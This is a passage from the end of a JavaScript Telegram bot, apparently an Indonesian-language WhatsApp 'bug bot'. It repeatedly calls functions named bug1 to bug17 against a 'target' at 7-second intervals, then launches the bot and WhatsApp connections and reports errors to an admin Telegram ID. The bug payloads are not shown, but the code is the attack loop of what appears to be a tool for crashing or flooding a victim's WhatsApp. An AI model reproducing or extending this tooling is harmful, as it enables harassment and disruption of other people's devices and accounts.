await sleep(7000)
await bug1(target)
await sleep(7000)
await bug7(target, ptcp = true)
await sleep(7000)
await bug8(target)
await sleep(7000)
await bug9(isTarget)
await sleep(7000)
await bug10(isTarget, show = true)
await sleep(7000)
await bug11(isTarget)
await sleep(7000)
await bug12(isTarget, show = true)
await sleep(7000)
await bug13(target, Ptcp = true)
await sleep(7000)
await bug14(target)
await sleep(7000)
await bug15(target) 
await sleep(7000)
await bug16(target)
await sleep(7000)
await bug17(target) 
await sleep(7000)
}
}

// --- Jalankan Bot ---
const ADMIN_ID = 7384381264; // id tele mu
function reportError(err) {
 const errorText = `❌ *Error Terdeteksi!*\n\`\`\`js\n${err.stack || err}\n\`\`\``;
 bot.telegram.sendMessage(ADMIN_ID, errorText, { parse_mode: "Markdown" }).catch(e => console.log("Gagal kirim error ke owner:", e));
}

async function initializeBot() {
console.clear();
console.log(chalk.bold.green(`
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉
`));
console.log("Telegram bot is running...");

await initializeWhatsAppConnections(); 
await bot.launch();
}

initializeBot().catch(err => {
console.error("Error during bot initialization:", err);
});

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));

process.on("uncaughtException", (err) => {
console.error("Uncaught Exception:", err);
reportError(err);
});

process.on("unhandledRejection", (reason) => {
console.error("Unhandled Rejection:", reason);
reportError(reason);
});